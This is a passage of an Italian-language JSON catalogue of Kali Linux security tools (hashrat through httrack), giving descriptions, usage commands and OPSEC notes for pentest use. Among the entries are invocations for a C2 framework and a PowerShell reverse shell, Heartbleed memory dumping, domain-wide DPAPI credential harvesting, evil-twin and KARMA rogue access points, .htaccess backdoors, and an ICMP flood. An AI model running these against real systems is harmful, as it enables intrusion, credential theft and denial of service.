    ],
    "notes": null
  },
  {
    "id": "hashrat",
    "name": "hashrat",
    "version": "1.25",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/hashrat/",
    "desc": "Calcola e verifica hash di file con supporto per algoritmi multipli e CGI mode.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>HashRat è un tool per calcolare e verificare hash di file con supporto per algoritmi multipli. Oltre alla funzionalità base di hashing, include CGI mode per uso web, recursive hashing e verifica di integrità. Alternativa leggera a md5sum/sha256sum con più feature.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Multiple Algorithms:</strong> MD5, SHA-1, SHA-256, SHA-512, Whirlpool.</p><p><strong>Recursive:</strong> Hash ricorsivo di directory.</p><p><strong>Verification:</strong> Verifica hash da file di controllo.</p><p><strong>CGI Mode:</strong> Funziona come script CGI per web.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Hash singolo file\nhashrat file.txt\n\n# SHA-256\nhashrat -sha256 file.txt\n\n# Ricorsivo\nhashrat -r /path/to/dir/\n\n# Verifica\nhashrat -c hashlist.txt</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>File Verification</strong>, verifica integrità download. Nel <strong>Forensics</strong>, calcola hash per chain of custody. <strong>Web Integration</strong> con CGI mode.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Utility:</strong> Tool di utility generale. Per forensics completa, considera hashdeep con audit mode.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "05_Forensics",
      "Disk_Analysis"
    ],
    "notes": null
  },
  {
    "id": "havoc",
    "name": "havoc",
    "version": "0.6~git20240910.69ce17c",
    "icon": "../app/icons/havoc-logo.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/havoc/",
    "desc": "C2 framework moderno con GUI, demon agent, BOF support e evasion integrata.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>Havoc è un framework C2 (Command and Control) moderno con GUI nativa e agent \"Demon\" altamente evasivo. Supporta Beacon Object Files (BOF), sleep obfuscation, syscall indiretti e tecniche anti-forensics. Alternativa open source a Cobalt Strike con feature all'avanguardia.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Demon Agent:</strong> Implant con evasion integrata.</p><p><strong>BOF Support:</strong> Esegue Beacon Object Files.</p><p><strong>Sleep Obfuscation:</strong> Nasconde agent in memoria durante sleep.</p><p><strong>Syscall Evasion:</strong> Syscall indiretti per evitare EDR.</p><p><strong>GUI Interface:</strong> Interfaccia grafica nativa completa.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Avvia teamserver\nsudo ./havoc server --profile profiles/havoc.yaotl\n\n# Avvia client GUI\n./havoc client\n\n# Genera payload da GUI\n# Configura listener, genera Demon payload\n# Deploy su target, gestisci sessioni dalla GUI</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>Red Team</strong>, C2 moderno con evasion avanzata. Nel <strong>Adversary Simulation</strong>, simula APT con tecniche attuali. <strong>Research</strong> su tecniche offensive moderne.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Detection:</strong> Signature sempre più note, modifica per engagement reali. BOF community ampliano capacità. Attivamente sviluppato.</p><br><hr>",
    "best_in": true,
    "category_path": [
      "04_Red_Team",
      "C2_Frameworks"
    ],
    "notes": null
  },
  {
    "id": "hcxtools",
    "name": "hcxtools",
    "version": "6.3.5",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/hcxtools/",
    "desc": "Converte capture WiFi (PMKID, handshake) in formato hashcat per cracking veloce.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>HCXtools è una suite di tool per conversione di capture WiFi in formato hashcat. Supporta PMKID (che non richiede handshake completo), handshake WPA/WPA2 e vari formati di capture. Essenziale per il workflow moderno di WiFi cracking con hashcat.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>PMKID Extraction:</strong> Estrae PMKID per cracking senza client.</p><p><strong>Format Conversion:</strong> Da .cap/.pcapng a formato hashcat.</p><p><strong>hcxdumptool:</strong> Cattura ottimizzata per hashcat.</p><p><strong>Analysis:</strong> Analizza qualità dei capture.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Converti capture a formato hashcat\nhcxpcapngtool -o hash.hc22000 capture.pcapng\n\n# Cattura ottimizzata\nhcxdumptool -i wlan0mon -o capture.pcapng\n\n# Estrai solo PMKID\nhcxpcapngtool --pmkid-only -o pmkid.hc22000 capture.pcap\n\n# Poi cracka con hashcat\nhashcat -m 22000 hash.hc22000 wordlist.txt</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>WiFi Cracking</strong>, prepara capture per hashcat. Nel <strong>PMKID Attack</strong>, cracka senza necessità di client. <strong>Wireless Assessment</strong> per testare robustezza password WiFi.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Preprocessing:</strong> Tool di conversione locale. PMKID attack più veloce perché non richiede deauth.</p><br><hr>",
    "best_in": true,
    "category_path": [
      "02_Exploitation",
      "Wireless",
      "WiFi"
    ],
    "notes": null
  },
  {
    "id": "heartleech",
    "name": "heartleech",
    "version": "0~git20140607.3ab1d60",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/heartleech/",
    "desc": "Exploit Heartbleed per estrarre memoria dal server SSL e recuperare chiavi private.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>Heartleech sfrutta la vulnerabilità Heartbleed (CVE-2014-0160) per estrarre memoria dal processo OpenSSL di server vulnerabili. Può recuperare chiavi private, session key, cookie e altri dati sensibili dalla memoria del server. Vulnerabilità storica ma server legacy potrebbero essere ancora vulnerabili.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Memory Extraction:</strong> Estrae 64KB di memoria per request.</p><p><strong>Private Key Recovery:</strong> Cerca chiavi private nella memoria.</p><p><strong>Automated:</strong> Loop automatico per massimizzare estrazione.</p><p><strong>Stealth Options:</strong> Modalità per ridurre detection.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Test se vulnerabile\nheartleech -t target.com -p 443\n\n# Estrai memoria\nheartleech target.com -f memory_dump.bin\n\n# Cerca chiavi private\nheartleech target.com --autopwn\n\n# Loop continuo\nheartleech target.com -l</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>Legacy Testing</strong>, verifica server vecchi non patchati. Nel <strong>CTF</strong>, challenge su vulnerabilità storiche. <strong>Learning</strong> per capire impatto di Heartbleed.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Patched:</strong> La maggior parte dei server è patchata dal 2014. Sfruttamento lascia tracce nei log. Solo per testing autorizzato.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "02_Exploitation",
      "Infrastructure",
      "SSL_TLS"
    ],
    "notes": null
  },
  {
    "id": "hekatomb",
    "name": "hekatomb",
    "version": "1.5.14",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/hekatomb/",
    "desc": "Estrae credenziali DPAPI da tutti i computer del dominio usando backup key del DC.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>Hekatomb estrae credenziali protette da DPAPI da tutti i computer di un dominio AD usando la backup key del Domain Controller. Con accesso admin al DC, recupera la backup key che permette di decriptare DPAPI secret da qualsiasi macchina del dominio, incluse password browser, WiFi e certificati.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Backup Key Extraction:</strong> Recupera DPAPI backup key dal DC.</p><p><strong>Domain-Wide:</strong> Decripta secret da tutte le macchine del dominio.</p><p><strong>Browser Passwords:</strong> Chrome, Edge, Firefox credentials.</p><p><strong>Certificates:</strong> Estrae certificati e chiavi private.</p><p><strong>WiFi Passwords:</strong> Credenziali WiFi salvate.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Estrai da tutto il dominio\nhekatomb -d domain.local -u admin -p password -dc dc.domain.local\n\n# Solo specifici computer\nhekatomb -d domain.local -u admin -H NTLMHASH --computers targets.txt\n\n# Esporta risultati\nhekatomb -d domain.local -u admin -p pass -dc dc -o results.json</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>AD Pentesting</strong>, post-exploitation massiva dopo domain admin. Nel <strong>Credential Harvesting</strong>, raccoglie password da tutto il dominio. <strong>Lateral Movement</strong> con credenziali trovate.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Admin Required:</strong> Richiede domain admin per backup key. Accessi SMB massivi potrebbero essere rilevati. Tool devastante post-compromise.</p><br><hr>",
    "best_in": true,
    "category_path": [
      "03_Post_Exploitation",
      "Credentials",
      "Dumping"
    ],
    "notes": null
  },
  {
    "id": "hexinject",
    "name": "hexinject",
    "version": "1.6",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/hexinject/",
    "desc": "Inietta pacchetti raw nella rete e sniffa traffico in formato hex per analisi manuale.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>HexInject è un tool per packet injection e sniffing a basso livello. Permette di iniettare pacchetti raw specificati in formato hex e catturare traffico visualizzandolo in hex per analisi manuale. Utile per crafting di pacchetti custom e debugging di protocolli.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Packet Injection:</strong> Inietta pacchetti raw hex.</p><p><strong>Hex Sniffing:</strong> Cattura traffico in formato hex.</p><p><strong>Raw Socket:</strong> Accesso a livello 2 e 3.</p><p><strong>Scripting:</strong> Integra con script per automazione.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Sniffa in hex\nhexinject -s -i eth0\n\n# Inietta pacchetto\necho \"ff ff ff ff ff ff 00 11 22 33 44 55 08 00 ...\" | hexinject -p -i eth0\n\n# Sniff e pipe a script\nhexinject -s -i eth0 | python analyze.py</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>Protocol Research</strong>, analizza e crafta pacchetti manualmente. Nel <strong>Exploit Development</strong>, testa payload a livello pacchetto. <strong>Network Debug</strong> per problemi di basso livello.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Low Level:</strong> Tool per esperti, richiede conoscenza protocolli. Injection può causare problemi di rete.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "01_Information_Gathering",
      "Network_Sniffing"
    ],
    "notes": null
  },
  {
    "id": "hoaxshell",
    "name": "hoaxshell",
    "version": "0.0~git20250119.e1bba89",
    "icon": "../app/icons/hoaxshell-logo.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/hoaxshell/",
    "desc": "Reverse shell via PowerShell che comunica con richieste HTTP per evitare detection.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>HoaxShell genera reverse shell PowerShell che comunicano via HTTP request invece di socket tradizionali. Le shell utilizzano comandi PowerShell legittimi per fetch e post di comandi, rendendo il traffico simile a normale navigazione web e più difficile da rilevare.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>HTTP Communication:</strong> Usa HTTP GET/POST invece di socket.</p><p><strong>PowerShell Native:</strong> Solo comandi PowerShell legittimi.</p><p><strong>Payload Generation:</strong> Genera vari tipi di payload.</p><p><strong>Constrained Mode Bypass:</strong> Opzioni per ambienti restrittivi.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Avvia listener e genera payload\npython3 hoaxshell.py -s YOUR_IP -p 8080\n\n# Genera payload specifico\npython3 hoaxshell.py -s YOUR_IP -p 8080 -t cmd\n\n# Sul target, esegui payload PowerShell generato\n# Interagisci con shell via HTTP</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>Red Team</strong>, shell che bypassa firewall egress. Nel <strong>Evasion</strong>, traffico HTTP meno sospetto di socket. <strong>Initial Access</strong> quando solo HTTP è permesso.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Detection:</strong> PowerShell logging cattura ancora i comandi. HTTP può essere ispezionato da proxy. Considera offuscamento aggiuntivo.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "04_Red_Team",
      "C2_Frameworks"
    ],
    "notes": null
  },
  {
    "id": "hostapd-mana",
    "name": "hostapd-mana",
    "version": "2.6.5",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/hostapd-mana/",
    "desc": "Hostapd patchato per creare rogue AP con KARMA attack e cattura credenziali EAP.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>Hostapd-MANA è hostapd patchato con supporto per KARMA attack, loud KARMA e cattura credenziali EAP. KARMA risponde a qualsiasi probe request, facendo connettere i client automaticamente. Include integrazione con sslstrip, responder e altri tool per attacchi wireless completi.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>KARMA Attack:</strong> Risponde a tutti i probe request.</p><p><strong>Loud KARMA:</strong> Broadcast attivo di SSID richiesti.</p><p><strong>EAP Capture:</strong> Cattura credenziali enterprise.</p><p><strong>Integration:</strong> Funziona con sslstrip, responder.</p><p><strong>ACL Support:</strong> Whitelist/blacklist MAC address.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Configura hostapd-mana.conf con KARMA\ninterface=wlan0\nenable_mana=1\nmana_loud=1\n\n# Avvia\nhostapd-mana hostapd-mana.conf\n\n# Combina con dnsmasq per DHCP\n# e sslstrip per HTTPS stripping</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>WiFi Pentesting</strong>, crea rogue AP che cattura client automaticamente. Nel <strong>Red Team</strong>, cattura credenziali in ambienti WiFi. <strong>Wireless Assessment</strong> per testare client security.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Detection:</strong> KARMA detectable da WIDS. Client moderni hanno protezioni. Richiede hardware compatibile AP mode.</p><br><hr>",
    "best_in": true,
    "category_path": [
      "02_Exploitation",
      "Wireless",
      "WiFi"
    ],
    "notes": null
  },
  {
    "id": "hostapd-wpe",
    "name": "hostapd-wpe",
    "version": "2.10",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/hostapd-wpe/",
    "desc": "Hostapd con Wireless Pwnage Edition patch per evil twin e credential harvesting.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>Hostapd-WPE (Wireless Pwnage Edition) è hostapd patchato per attacchi evil twin su reti WPA2-Enterprise. Cattura credenziali EAP (PEAP, EAP-TTLS, EAP-TLS) dai client che si connettono al fake AP. I challenge/response catturati possono essere crackati offline.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Evil Twin:</strong> Clona SSID enterprise per attacchi.</p><p><strong>EAP Logging:</strong> Cattura tutti i tentativi di autenticazione.</p><p><strong>MSCHAPv2:</strong> Cattura challenge/response per cracking.</p><p><strong>Certificate:</strong> Usa certificati self-signed.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Configura hostapd-wpe.conf\ninterface=wlan0\nssid=CorpWiFi\nwpa=2\nwpa_key_mgmt=WPA-EAP\n\n# Avvia\nhostapd-wpe hostapd-wpe.conf\n\n# Credenziali in /var/log/hostapd-wpe.log\n# Cracka MSCHAPv2 con hashcat -m 5500</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>WiFi Pentesting</strong>, attacca reti enterprise. Nel <strong>Red Team</strong>, ottiene credenziali domain. <strong>Assessment</strong> di sicurezza client WiFi.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Detection:</strong> Certificate mismatch può alertare utenti. WIDS rileva rogue AP. Usa eaphammer per setup più semplice.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "02_Exploitation",
      "Wireless",
      "WiFi"
    ],
    "notes": null
  },
  {
    "id": "hosthunter",
    "name": "hosthunter",
    "version": "1.6",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/hosthunter/",
    "desc": "Trova hostname associati a IP usando reverse DNS, SSL cert e API web.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>HostHunter trova hostname e domini associati a indirizzi IP usando multiple fonti: reverse DNS lookup, analisi certificati SSL, VirusTotal API, e Bing. Utile per scoprire virtual host e domini ospitati su un IP quando hai solo l'indirizzo.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Multi-Source:</strong> Reverse DNS, SSL cert, VirusTotal, Bing.</p><p><strong>SSL Analysis:</strong> Estrae SAN e CN dai certificati.</p><p><strong>Batch Processing:</strong> Processa liste di IP.</p><p><strong>Output Formats:</strong> CSV, TXT per integrazione.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Singolo IP\nhosthunter -i 93.184.216.34\n\n# Lista di IP\nhosthunter -f ip_list.txt\n\n# Output CSV\nhosthunter -f ips.txt -o results.csv\n\n# Con API key VirusTotal\nhosthunter -f ips.txt --vt-key YOUR_KEY</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>Reconnaissance</strong>, trova tutti i domini su un IP. Nel <strong>Bug Bounty</strong>, scopri altri siti sullo stesso server. <strong>Pivot</strong> da IP a hostname per attacchi web.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Mixed:</strong> Alcune query sono passive (SSL), altre attive (connessione). API key necessarie per VirusTotal.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "01_Information_Gathering",
      "Recon",
      "Infrastructure",
      "DNS_Subdomains"
    ],
    "notes": null
  },
  {
    "id": "hostsman",
    "name": "hostsman",
    "version": "1.1.5",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/hostsman/",
    "desc": "Enumera virtual host su web server analizzando risposte HTTP a diversi hostname.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>HostsMan enumera virtual host su web server inviando request HTTP con diversi valori di Host header e analizzando le risposte. Trova vhost nascosti che non sono linkati pubblicamente ma rispondono sul server target.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Host Header Fuzzing:</strong> Testa hostname da wordlist.</p><p><strong>Response Analysis:</strong> Confronta risposte per identificare vhost.</p><p><strong>SSL Support:</strong> Funziona su HTTPS.</p><p><strong>Custom Ports:</strong> Test su porte non standard.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Enumera vhost\nhostsman -u http://target.com -w vhosts.txt\n\n# Su HTTPS\nhostsman -u https://target.com -w vhosts.txt\n\n# Con filtri\nhostsman -u http://target.com -w vhosts.txt --fc 404</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>Virtual Host Discovery</strong>, trova siti nascosti sullo stesso server. Nel <strong>Bug Bounty</strong>, scopri scope aggiuntivo. <strong>Pentest</strong> per enumerare superfice d'attacco.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Active:</strong> Genera traffico HTTP verso il target. Alternative: gobuster vhost mode, ffuf con Host header.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "01_Information_Gathering",
      "Recon",
      "Web",
      "Content_Discovery"
    ],
    "notes": null
  },
  {
    "id": "hping3",
    "name": "hping3",
    "version": "3.a2.ds2",
    "icon": "../app/icons/hping3-logo.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/hping3/",
    "desc": "Packet crafter TCP/IP per firewall testing, traceroute avanzato e OS fingerprinting.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>Hping3 è un generatore e analizzatore di pacchetti TCP/IP a riga di comando. Permette di creare pacchetti custom per testing firewall, OS fingerprinting, traceroute avanzato, trasferimento file covert e test di performance. Tool storico ma ancora molto utile.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Packet Crafting:</strong> Crea pacchetti TCP/UDP/ICMP/RAW custom.</p><p><strong>Firewall Testing:</strong> Testa regole con flag specifici.</p><p><strong>OS Fingerprinting:</strong> Identifica OS da risposte.</p><p><strong>Traceroute:</strong> Traceroute con qualsiasi protocollo.</p><p><strong>File Transfer:</strong> Trasferimento covert via ICMP.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Ping TCP SYN su porta 80\nhping3 -S target.com -p 80\n\n# Traceroute TCP\nhping3 -S target.com -p 80 -T\n\n# Port scan\nhping3 -S target.com -p ++1\n\n# Spoof source IP\nhping3 -S target.com -a fake.source.ip\n\n# ICMP flood (attento!)\nhping3 --icmp --flood target.com</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>Firewall Testing</strong>, verifica quali flag/porte passano. Nel <strong>Network Research</strong>, analizza comportamenti stack TCP/IP. <strong>Evasion</strong> con pacchetti custom.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Powerful:</strong> Può essere usato per DoS se non attento. Flood options solo su sistemi propri. Pacchetti custom possono triggerare IDS.</p><br><hr>",
    "best_in": true,
    "category_path": [
      "01_Information_Gathering",
      "Recon",
      "Infrastructure",
      "Port_Scanning"
    ],
    "notes": null
  },
  {
    "id": "htshells",
    "name": "htshells",
    "version": "0.1~git20131205",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/htshells/",
    "desc": "Collezione di .htaccess backdoor per eseguire comandi su server Apache vulnerabili.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>HTShells è una collezione di file .htaccess malevoli per ottenere code execution su server Apache misconfigured. Sfrutta direttive Apache come AddHandler, php_flag e altre per eseguire PHP o CGI quando .htaccess upload è permesso e non filtrato.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Multiple Techniques:</strong> Varie tecniche .htaccess per RCE.</p><p><strong>Apache Specific:</strong> Sfrutta feature Apache.</p><p><strong>Bypass Filters:</strong> Varie tecniche per bypass filtri upload.</p><p><strong>Ready to Use:</strong> File pronti per upload e test.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># I file sono in /usr/share/htshells/\nls /usr/share/htshells/\n\n# Esempio: se puoi uploadare .htaccess\n# Carica shell.htaccess come .htaccess\n# Poi accedi a shell.gif (rinominato .php)\n\n# Studia le tecniche nei file per capire come funzionano</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>Web Exploitation</strong>, RCE via upload misconfiguration. Nel <strong>CTF</strong>, challenge su upload filter bypass. <strong>Learning</strong> su Apache security.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Specifico:</strong> Funziona solo su Apache con AllowOverride. Server moderni spesso limitano .htaccess. Verifica configurazione target.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "02_Exploitation",
      "Web",
      "File_Upload"
    ],
    "notes": null
  },
  {
    "id": "httprint",
    "name": "httprint",
    "version": "0.301",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/httprint/",
    "desc": "Web server fingerprinting tool che identifica software anche dietro reverse proxy.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>HTTPrint è un tool per web server fingerprinting che identifica il software del server analizzando comportamenti HTTP caratteristici. Usa tecniche di signature matching che funzionano anche quando il server nasconde il banner o è dietro reverse proxy.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Signature Matching:</strong> Database di signature per server comuni.</p><p><strong>Behavior Analysis:</strong> Analizza risposte a request anomale.</p><p><strong>Banner Bypass:</strong> Identifica anche con banner nascosto.</p><p><strong>Proxy Detection:</strong> Rileva reverse proxy.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Fingerprint singolo server\nhttprint -h target.com -s signatures.txt\n\n# Su porta specifica\nhttprint -h target.com:8080 -s signatures.txt\n\n# HTTPS\nhttprint -h target.com -P0 -s signatures.txt\n\n# Output HTML\nhttprint -h target.com -s signatures.txt -o report.html</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>Reconnaissance</strong>, identifica web server per selezionare exploit. Nel <strong>Vulnerability Assessment</strong>, determina versioni per CVE matching. <strong>Pentest</strong> quando banner è nascosto.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Active:</strong> Invia request HTTP anomale, può essere loggato. Tool datato, considera alternative come Wappalyzer, WhatWeb.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "01_Information_Gathering",
      "Recon",
      "Web",
      "Fingerprinting",
      "HTTP_Analysis"
    ],
    "notes": null
  },
  {
    "id": "httprobe",
    "name": "httprobe",
    "version": "0.2",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/httprobe/",
    "desc": "Verifica rapidamente quali domini di una lista hanno server HTTP/HTTPS attivi.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>HTTProbe verifica rapidamente quali domini di una lista hanno server HTTP o HTTPS attivi. Prende input da stdin e output i domini che rispondono. Perfetto per filtrare output di tool di subdomain enumeration prima di ulteriore analisi.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Fast Probing:</strong> Verifica veloce di molti domini.</p><p><strong>HTTP/HTTPS:</strong> Testa entrambi i protocolli.</p><p><strong>Stdin/Stdout:</strong> Perfetto per pipeline.</p><p><strong>Concurrent:</strong> Request parallele per velocità.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Verifica quali domini rispondono\ncat subdomains.txt | httprobe\n\n# Solo HTTPS\ncat subdomains.txt | httprobe -s -p https:443\n\n# Porte custom\ncat subs.txt | httprobe -p http:8080 -p https:8443\n\n# Pipeline completa\nsubfinder -d target.com | httprobe | nuclei</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>Subdomain Validation</strong>, filtra subdomain con web server attivo. Nel <strong>Bug Bounty</strong>, focus su target raggiungibili. <strong>Pipeline</strong> come step intermedio.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Active:</strong> Connessioni HTTP a tutti i domini testati. Genera traffico significativo su grandi liste. Rate limiting consigliato.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "01_Information_Gathering",
      "Recon",
      "Web",
      "Fingerprinting",
      "HTTP_Analysis"
    ],
    "notes": null
  },
  {
    "id": "httpx-toolkit",
    "name": "httpx-toolkit",
    "version": "1.1.5",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/httpx-toolkit/",
    "desc": "HTTP probe velocissimo con estrazione titolo, status code, tecnologie e screenshot.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>HTTPx è un toolkit HTTP multi-purpose sviluppato da ProjectDiscovery. Esegue probe HTTP/HTTPS su larga scala estraendo titoli, status code, tecnologie, content-length, screenshot e molto altro. Estremamente veloce grazie a goroutines concorrenti, è fondamentale nelle pipeline di bug bounty.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Multi-probe:</strong> HTTP/HTTPS, ports custom, path specifici.</p><p><strong>Tech Detection:</strong> Integra Wappalyzer per fingerprinting.</p><p><strong>Screenshot:</strong> Cattura automatica pagine web.</p><p><strong>Output ricco:</strong> JSON, CSV con tutti i metadati.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Probe base con titolo e status\ncat subdomains.txt | httpx -title -status-code\n\n# Estrazione completa\nhttpx -l urls.txt -tech-detect -content-length -json\n\n# Con screenshot\nhttpx -l targets.txt -screenshot -screenshot-timeout 10\n\n# Pipeline completa\nsubfinder -d target.com | httpx -silent | nuclei</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>Bug Bounty</strong>, filtra e arricchisce liste di subdomain. Nel <strong>Recon</strong>, identifica rapidamente tecnologie e versioni. <strong>Monitoring</strong> per cambiamenti su asset.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Active:</strong> Connessioni HTTP dirette. User-agent identificabile (customizzabile). Alto volume di request su target multipli.</p><br><hr>",
    "best_in": true,
    "category_path": [
      "01_Information_Gathering",
      "Recon",
      "Web",
      "Fingerprinting",
      "HTTP_Analysis"
    ],
    "notes": null
  },
  {
    "id": "httrack",
    "name": "httrack",
    "version": "3.49.6",
    "icon": "../app/icons/httrack-logo.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/httrack/",
    "desc": "Web crawler per download offline di siti completi mantenendo struttura link.",
